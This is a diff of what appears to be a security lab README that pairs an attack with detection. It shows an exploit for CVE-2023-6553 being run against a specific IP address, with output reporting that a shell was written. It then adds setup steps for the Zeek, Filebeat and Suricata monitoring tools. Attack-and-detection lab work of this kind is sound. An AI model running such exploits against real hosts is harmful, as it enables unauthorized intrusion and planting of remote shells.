@@ -67,7 +67,7 @@ python exploit.py -u http://3.144.10.220
 ```
 
 ```
-(venv) yinuodu@S3Ds-MacBook-Pro-10 CVE-2023-6553 % python exploit.py -u http://3.144.10.220      
+python exploit.py -u http://3.144.10.220      
 
 http://3.144.10.220 is vulnerable to CVE-2023-6553
 Initiating shell deployment. This may take a moment...
@@ -76,7 +76,7 @@ Shell written successfully.
 # 
 ```
 
-- install Zeek
+- install Zeek on each host
 ```
 sudo apt update -y
 sudo apt install -y wget gnupg lsb-release
@@ -84,4 +84,26 @@ echo 'deb http://download.opensuse.org/repositories/security:/zeek/xUbuntu_22.04
 curl -fsSL https://download.opensuse.org/repositories/security:zeek/xUbuntu_22.04/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg > /dev/null
 sudo apt update
 sudo apt install zeek-6.0
+```
+
+- configure & start Zeek
+```
+sudo sed -i 's!^interface=.*!interface=ens5!' /opt/zeek/etc/node.cfg
+sudo setcap cap_net_raw,cap_net_admin+eip /opt/zeek/bin/zeek
+sudo /opt/zeek/bin/zeekctl deploy
+sudo /opt/zeek/bin/zeekctl status
+sudo tail -n5 /opt/zeek/logs/current/conn.log
+```
+
+- Centralize Zeek Logs
+```
+curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-9.0.0-amd64.deb
+sudo dpkg -i filebeat-9.0.0-amd64.deb
+sudo filebeat modules enable zeek
+sudo apt update -y
+sudo apt install -y suricata
+sudo sed -i   's/^\(\s*-\s*interface:\s*\).*$/\1ens5/'   /etc/suricata/suricata.yaml
+sudo systemctl daemon-reload
+sudo systemctl restart suricata
+sudo systemctl status suricata --no-pager
 ```
